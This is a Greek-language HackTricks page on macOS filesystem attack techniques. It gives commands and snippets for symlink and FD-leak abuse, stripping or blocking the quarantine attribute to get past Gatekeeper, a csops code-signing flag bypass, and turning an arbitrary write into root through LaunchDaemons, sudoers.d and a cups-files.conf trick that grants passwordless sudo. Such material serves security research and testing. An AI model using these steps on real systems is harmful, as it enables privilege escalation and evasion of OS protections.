# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

Permissions σε έναν **κατάλογο**:

- **read** - μπορείτε να **enumerate** τις εγγραφές του καταλόγου
- **write** - μπορείτε να **delete/write** **αρχεία** στον κατάλογο και μπορείτε να **delete empty folders**.
- Ωστόσο, **δεν μπορείτε να delete/modify μη-κενά folders** εκτός αν έχετε δικαιώματα write σε αυτά.
- **Δεν μπορείτε να τροποποιήσετε το όνομα ενός folder** εκτός αν σας ανήκει.
- **execute** - σας επιτρέπεται να **διασχίσετε** τον κατάλογο - αν δεν έχετε αυτό το δικαίωμα, δεν μπορείτε να αποκτήσετε πρόσβαση σε αρχεία μέσα σε αυτόν ή σε υποκαταλόγους.

### Dangerous Combinations

**Πώς να overwrite ένα file/folder που ανήκει στον root**, αλλά:

- Ένας γονικός **directory owner** στη διαδρομή είναι ο χρήστης
- Ένας γονικός **directory owner** στη διαδρομή είναι μια **ομάδα χρηστών** με **write access**
- Μια **ομάδα χρηστών** έχει **write** access στο **file**

Με οποιονδήποτε από τους προηγούμενους συνδυασμούς, ένας attacker θα μπορούσε να **inject** ένα **sym/hard link** στη διαδρομή που αναμένεται, ώστε να αποκτήσει privileged arbitrary write.

### Folder root R+X Special case

Αν υπάρχουν αρχεία σε έναν **κατάλογο** όπου **μόνο ο root έχει πρόσβαση R+X**, αυτά **δεν είναι προσβάσιμα σε κανέναν άλλον**. Επομένως, μια ευπάθεια που επιτρέπει να **μετακινηθεί ένα αρχείο αναγνώσιμο από έναν χρήστη**, το οποίο δεν μπορεί να διαβαστεί λόγω αυτού του **περιορισμού**, από αυτόν τον φάκελο **σε διαφορετικό**, θα μπορούσε να γίνει abuse για την ανάγνωση αυτών των αρχείων.

Παράδειγμα στο: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

Αν μια privileged process γράφει δεδομένα σε ένα **file** που θα μπορούσε να **ελεγχθεί** από έναν **χρήστη με χαμηλότερα privileges** ή που θα μπορούσε να έχει **δημιουργηθεί προηγουμένως** από έναν χρήστη με χαμηλότερα privileges, ο χρήστης θα μπορούσε απλώς να το **κατευθύνει σε άλλο αρχείο** μέσω ενός Symbolic ή Hard link, και η privileged process θα γράψει σε αυτό το αρχείο.

Ελέγξτε τις άλλες ενότητες όπου ένας attacker θα μπορούσε να **κάνει abuse ένα arbitrary write για να κάνει privilege escalation**.

### Open `O_NOFOLLOW`

Σύμφωνα με το [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"Αν χρησιμοποιείται το `O_NOFOLLOW` στη mask και το target file που περνά στο `open()` είναι symbolic link, τότε το `open()` θα αποτύχει."* Ελέγχεται μόνο το **τελικό** component — κάθε **ενδιάμεσο** component εξακολουθεί να επιλύεται και να ακολουθείται. Επομένως, ένας developer που "προστάτευσε" ένα write με `O_NOFOLLOW` μπορεί ακόμη να δεχτεί επίθεση μέσω planting ενός symlink σε οποιονδήποτε **γονικό κατάλογο** της target path.

Η ίδια man page τεκμηριώνει τα flags που κλείνουν πραγματικά αυτό το κενό:

- **`O_NOFOLLOW_ANY`** — *"αν ... οποιοδήποτε component της path που περνά στο `open()` είναι symbolic link, τότε το `open()` θα αποτύχει."*
- **`O_RESOLVE_BENEATH`** — *"αν ... η καθορισμένη path resolution διαφύγει από τον κατάλογο που σχετίζεται με το fd, τότε το `openat()` θα αποτύχει."*

Διαφορετικά, το `openat()` relative σε ένα directory FD που έχετε ήδη επικυρώσει ή το `realpath()` + re-validation είναι οι εναπομείναντες τρόποι για να σταματήσετε τα symlink swaps στο μέσο της διαδρομής.

## .fileloc

Αρχεία με extension **`.fileloc`** μπορούν να δείχνουν σε άλλες εφαρμογές ή binaries, έτσι ώστε όταν ανοίγουν, να εκτελείται η συγκεκριμένη εφαρμογή/binary.\
Παράδειγμα:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Περιγραφείς αρχείων

### Leak FD (χωρίς `O_CLOEXEC`)

Αν μια κλήση στη `open` δεν έχει το flag `O_CLOEXEC`, ο περιγραφέας αρχείου θα κληρονομηθεί από τη θυγατρική διεργασία. Επομένως, αν μια διεργασία με προνόμια ανοίξει ένα προνομιακό αρχείο και εκτελέσει μια διεργασία που ελέγχεται από τον attacker, ο attacker θα **κληρονομήσει το FD προς το προνομιακό αρχείο**.

Το canonical παράδειγμα είναι το **`DYLD_PRINT_TO_FILE` LPE στο OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):

- Το `dyld` τιμούσε το `DYLD_PRINT_TO_FILE=/path` ακόμη και σε **περιορισμένα (suid root) binaries**, επειδή η συγκεκριμένη μεταβλητή γινόταν parse εκτός της `processDyldEnvironmentVariable()`.
- Εκτελούσε `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, οπότε **δημιουργούσε ένα αρχείο που ανήκε στον root σε αυθαίρετη διαδρομή**.
- Το FD **δεν έκλεινε ποτέ και δεν είχε flag close-on-exec**, επομένως κάθε child του suid binary κληρονομούσε ένα **writable FD προς ένα αρχείο που ανήκε στον root**.
- Η εκτέλεση, για παράδειγμα, της `DYLD_PRINT_TO_FILE=/etc/target suid_binary` και στη συνέχεια η ανάγνωση του αριθμού του κληρονομημένου FD στο child επέτρεπε αυθαίρετες εγγραφές σε αρχεία που ανήκαν στον root· το `fcntl(fd, F_SETFL, 0)` μπορούσε ακόμη και να καθαρίσει το `O_APPEND`, επιτρέποντας την αντικατάσταση αντί για προσθήκη.

Το ίδιο μοτίβο εμφανίζεται κάθε φορά που μια διεργασία με προνόμια ανοίγει ένα αρχείο **πριν** εκτελέσει με `exec` κάτι που ελέγχετε (helper tools, editors τύπου `crontab` που καλούνται μέσω του `$EDITOR`, αρχεία log/debug που ανοίγουν από διαδρομή μεταβλητής περιβάλλοντος...). Enumerate τα FDs που κληρονομήσατε με:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Οτιδήποτε πάνω από το `2` που παραπέμπει σε αρχείο το οποίο δεν μπορείτε να ανοίξετε οι ίδιοι αποτελεί primitive arbitrary-write (ή arbitrary-read).

## Αποφυγή τεχνασμάτων quarantine xattrs

### Αφαιρέστε το
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Εάν ένα αρχείο/φάκελος έχει αυτό το immutable attribute, δεν θα είναι δυνατή η τοποθέτηση ενός xattr σε αυτόν.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Συστήματα αρχείων χωρίς υποστήριξη xattr

Δεν αποθηκεύουν εγγενώς **extended attributes** όλα τα συστήματα αρχείων που μπορεί να προσαρτήσει το macOS. Τα HFS+ και APFS το κάνουν· τα **FAT32, exFAT και οι περισσότερες προσαρτήσεις NFS δεν το κάνουν** — το macOS τα προσομοιώνει γράφοντας ένα βοηθητικό αρχείο **AppleDouble** με όνομα `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).

Αυτό έχει σημασία για το quarantine, επειδή το xattr διατηρείται μόνο αν μπορεί πράγματι να γραφτεί **και να διαβαστεί ξανά** από τον ίδιο τόμο:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Εάν ο τόμος διαβαστεί αργότερα μέσω μιας διαδρομής που αγνοεί το συνοδευτικό `._` (ή το συνοδευτικό αφαιρεθεί/διαγραφεί), το αρχείο φτάνει **χωρίς quarantine flag** — και ένα unquarantined `.app` αρκεί για να παρακάμψει το App Sandbox, όπως καλύπτεται στο [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Αυτό το ACL εμποδίζει την προσθήκη `xattrs` στο αρχείο
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Η μορφή αρχείου **AppleDouble** αντιγράφει ένα αρχείο μαζί με τα ACEs του.

Στον [**πηγαίο κώδικα**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) είναι δυνατό να δούμε ότι η αναπαράσταση ACL σε μορφή κειμένου, αποθηκευμένη μέσα στο xattr που ονομάζεται **`com.apple.acl.text`**, πρόκειται να οριστεί ως ACL στο αποσυμπιεσμένο αρχείο. Επομένως, αν συμπιέζατε μια εφαρμογή σε αρχείο zip με τη μορφή αρχείου **AppleDouble**, χρησιμοποιώντας ένα ACL που αποτρέπει την εγγραφή άλλων xattrs σε αυτήν... το quarantine xattr δεν οριζόταν στην εφαρμογή:

Δείτε την [**αρχική αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) για περισσότερες πληροφορίες.

Για την αναπαραγωγή αυτού, πρέπει πρώτα να λάβουμε το σωστό string ACL:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Σημειώστε ότι, ακόμη και αν αυτό λειτουργεί, το sandbox γράφει πρώτα το quarantine xattr)

Δεν είναι πραγματικά απαραίτητο, αλλά το αφήνω εκεί για κάθε ενδεχόμενο:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Παράκαμψη ελέγχων υπογραφής

### Παράκαμψη ελέγχων platform binaries

Ορισμένοι έλεγχοι ασφαλείας ελέγχουν αν το binary είναι **platform binary**, για παράδειγμα για να επιτρέψουν τη σύνδεση σε μια υπηρεσία XPC. Ωστόσο, όπως παρουσιάζεται στο bypass στο https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ είναι δυνατή η παράκαμψη αυτού του ελέγχου με τη λήψη ενός platform binary (όπως το /bin/ls) και την έγχυση του exploit μέσω του dyld, χρησιμοποιώντας μια μεταβλητή περιβάλλοντος `DYLD_INSERT_LIBRARIES`.

### Παράκαμψη των flags `CS_REQUIRE_LV` και `CS_FORCED_LV`

Είναι δυνατό για ένα binary που εκτελείται να τροποποιήσει τα δικά του flags, ώστε να παρακάμψει τους ελέγχους, με κώδικα όπως ο εξής:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Τα bundles περιέχουν το αρχείο **`_CodeSignature/CodeResources`**, το οποίο περιέχει το **hash** κάθε **αρχείου** μέσα στο **bundle**. Σημειώστε ότι το hash του CodeResources είναι επίσης **ενσωματωμένο στο executable**, επομένως δεν μπορούμε να επέμβουμε ούτε σε αυτό.

Ωστόσο, υπάρχουν ορισμένα αρχεία των οποίων η υπογραφή δεν θα ελεγχθεί. Αυτά έχουν το key `omit` στο plist, όπως:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Είναι δυνατό να υπολογιστεί η υπογραφή ενός resource από το cli με:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Προσάρτηση dmgs

Ένας χρήστης μπορεί να προσαρτήσει ένα custom dmg που έχει δημιουργήσει ακόμη και πάνω από ορισμένους υπάρχοντες φακέλους. Έτσι θα μπορούσατε να δημιουργήσετε ένα custom dmg package με custom περιεχόμενο:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Συνήθως το macOS κάνει mount τον δίσκο επικοινωνώντας με το Mach service `com.apple.DiskArbitrarion.diskarbitrariond` (που παρέχεται από το `/usr/libexec/diskarbitrationd`). Αν προσθέσετε την παράμετρο `-d` στο αρχείο plist του LaunchDaemons και κάνετε επανεκκίνηση, θα αποθηκεύει logs στο `/var/log/diskarbitrationd.log`.\
Ωστόσο, είναι δυνατό να χρησιμοποιήσετε εργαλεία όπως τα `hdik` και `hdiutil` για άμεση επικοινωνία με το kext `com.apple.driver.DiskImages`.

## Αυθαίρετες εγγραφές

### Περιοδικά sh scripts

Αν το script σας μπορούσε να ερμηνευτεί ως **shell script**, θα μπορούσατε να αντικαταστήσετε το **`/etc/periodic/daily/999.local`** shell script, το οποίο θα εκτελείται κάθε μέρα.

Μπορείτε να **προσομοιώσετε** την εκτέλεση αυτού του script με: **`sudo periodic daily`**

### Daemons

Γράψτε ένα αυθαίρετο **LaunchDaemon**, όπως το **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, με ένα plist που εκτελεί ένα αυθαίρετο script, όπως:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Απλώς δημιουργήστε το script `/Applications/Scripts/privesc.sh` με τις **commands** που θέλετε να εκτελέσετε ως root.

### Sudoers File

Αν έχετε **arbitrary write**, θα μπορούσατε να δημιουργήσετε ένα αρχείο μέσα στον φάκελο **`/etc/sudoers.d/`**, παραχωρώντας στον εαυτό σας δικαιώματα **sudo**.

### PATH files

Το αρχείο **`/etc/paths`** είναι ένα από τα κύρια σημεία που συμπληρώνουν τη μεταβλητή περιβάλλοντος PATH. Πρέπει να είστε root για να το αντικαταστήσετε, αλλά αν ένα script από **privileged process** εκτελεί κάποια **command χωρίς το πλήρες path**, ενδέχεται να μπορέσετε να κάνετε **hijack**, τροποποιώντας αυτό το αρχείο.

Μπορείτε επίσης να γράψετε αρχεία στο **`/etc/paths.d`** για να φορτώσετε νέους φακέλους στη μεταβλητή περιβάλλοντος `PATH`.

### cups-files.conf

Αυτή η τεχνική χρησιμοποιήθηκε σε αυτό το [writeup](https://www.kandji.io/blog/macos-audit-story-part1).

Δημιουργήστε το αρχείο `/etc/cups/cups-files.conf` με το ακόλουθο περιεχόμενο:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Αυτό θα δημιουργήσει το αρχείο `/etc/sudoers.d/lpe` με δικαιώματα 777. Τα επιπλέον άχρηστα δεδομένα στο τέλος χρησιμεύουν για να ενεργοποιηθεί η δημιουργία του error log.

Στη συνέχεια, γράψτε στο `/etc/sudoers.d/lpe` την απαιτούμενη ρύθμιση για privilege escalation, όπως `%staff ALL=(ALL) NOPASSWD:ALL`.

Έπειτα, τροποποιήστε ξανά το αρχείο `/etc/cups/cups-files.conf`, ορίζοντας `LogFilePerm 700`, ώστε το νέο sudoers file να γίνει έγκυρο μέσω της εκτέλεσης του `cupsctl`.

### Escape από το Sandbox

Είναι δυνατή η έξοδος από το macOS sandbox με ένα FS arbitrary write. Για ορισμένα παραδείγματα, δείτε τη σελίδα [macOS Auto Start](../../../../macos-auto-start-locations.md), αλλά μια συνηθισμένη περίπτωση είναι η εγγραφή ενός Terminal preferences file στο `~/Library/Preferences/com.apple.Terminal.plist`, το οποίο εκτελεί μια εντολή κατά την εκκίνηση, και η κλήση του μέσω `open`.

## Δημιουργία εγγράψιμων αρχείων ως άλλοι users

Ένα πολύ συνηθισμένο privesc primitive είναι να αναγκάσετε μια **privileged process να δημιουργήσει ένα αρχείο για εσάς** σε έναν κατάλογο που ελέγχετε και στη συνέχεια να διατηρήσετε **write access** σε αυτό το αρχείο. Απαιτούνται δύο στοιχεία:

1. Ένας κατάλογος που σας ανήκει (ή στον οποίο μπορείτε να ορίσετε ένα **inheritable ACL**), ώστε οτιδήποτε δημιουργείται μέσα σε αυτόν να κληρονομεί τα δικαιώματά σας.
2. Μια privileged/`suid` process που μπορεί να καθοδηγηθεί ως προς το **πού** θα δημιουργήσει ένα αρχείο — συνήθως μέσω ενός debug/logging environment variable, ενός config file ή του XPC API ενός helper.

Το τμήμα του **inheritable ACL** είναι αυτό που κάνει το δημιουργημένο αρχείο writable από εσάς, παρόλο που ανήκει σε άλλον user. Τα flags κληρονομικότητας `file_inherit` / `directory_inherit` τεκμηριώνονται στο [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Τώρα οποιοδήποτε αρχείο δημιουργεί μια privileged διεργασία μέσα στο `$DIRNAME` είναι **writable από εσάς**. Αν αυτός ο κατάλογος είναι επίσης μια τοποθεσία από την οποία γίνεται αργότερα **εκτέλεση ως root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, ένας κατάλογος LaunchDaemon...), αυτό οδηγεί άμεσα σε root escalation. Δείτε τις ενότητες [Sudoers File](#sudoers-file) και [cups-files.conf](#cups-filesconf) παραπάνω για το τι πρέπει να γράψετε μόλις αποκτήσετε το αρχείο.

Για ένα πλήρες worked example της αλυσίδας "μια env variable κάνει μια root διεργασία να δημιουργήσει ένα αρχείο και το FD διαρρέει σε εσάς", δείτε την ενότητα [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) παραπάνω.

## POSIX Shared Memory

Η **POSIX shared memory** επιτρέπει σε διεργασίες λειτουργικών συστημάτων συμβατών με POSIX να έχουν πρόσβαση σε μια κοινή περιοχή μνήμης, διευκολύνοντας ταχύτερη επικοινωνία σε σύγκριση με άλλες μεθόδους inter-process communication. Περιλαμβάνει τη δημιουργία ή το άνοιγμα ενός shared memory object με τη `shm_open()`, τον καθορισμό του μεγέθους του με τη `ftruncate()` και τη χαρτογράφησή του στον address space της διεργασίας με τη χρήση της `mmap()`. Στη συνέχεια, οι διεργασίες μπορούν να διαβάζουν απευθείας από και να γράφουν σε αυτή την περιοχή μνήμης. Για τη διαχείριση ταυτόχρονης πρόσβασης και την αποτροπή corruption δεδομένων, χρησιμοποιούνται συχνά μηχανισμοί synchronization, όπως mutexes ή semaphores. Τέλος, οι διεργασίες κάνουν unmap και close τη shared memory με τις `munmap()` και `close()` και, προαιρετικά, αφαιρούν το memory object με τη `shm_unlink()`. Αυτό το σύστημα είναι ιδιαίτερα αποτελεσματικό για αποδοτικό και γρήγορο IPC σε περιβάλλοντα όπου πολλές διεργασίες χρειάζεται να έχουν γρήγορη πρόσβαση σε shared data.

<details>

<summary>Παράδειγμα κώδικα Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Παράδειγμα κώδικα καταναλωτή</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

Τα **macOSCguarded descriptors** είναι μια δυνατότητα ασφαλείας που εισήχθη στο macOS για τη βελτίωση της ασφάλειας και της αξιοπιστίας των **file descriptor operations** σε εφαρμογές χρηστών. Αυτά τα guarded descriptors παρέχουν έναν τρόπο συσχέτισης συγκεκριμένων περιορισμών ή "guards" με file descriptors, οι οποίοι επιβάλλονται από τον kernel.

Αυτή η δυνατότητα είναι ιδιαίτερα χρήσιμη για την αποτροπή συγκεκριμένων κατηγοριών ευπαθειών ασφαλείας, όπως η **μη εξουσιοδοτημένη πρόσβαση σε αρχεία** ή οι **συνθήκες ανταγωνισμού**. Αυτές οι ευπάθειες εμφανίζονται, για παράδειγμα, όταν ένα thread αποκτά πρόσβαση σε ένα file description, παρέχοντας **σε ένα άλλο ευάλωτο thread πρόσβαση σε αυτό**, ή όταν ένα file descriptor **κληρονομείται** από μια ευάλωτη child process. Ορισμένες συναρτήσεις που σχετίζονται με αυτή τη λειτουργικότητα είναι:

- `guarded_open_np`: Ανοίγει ένα FD με guard
- `guarded_close_np`: Το κλείνει
- `change_fdguard_np`: Αλλάζει τα guard flags σε έναν descriptor (ακόμη και αφαιρώντας την προστασία guard)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
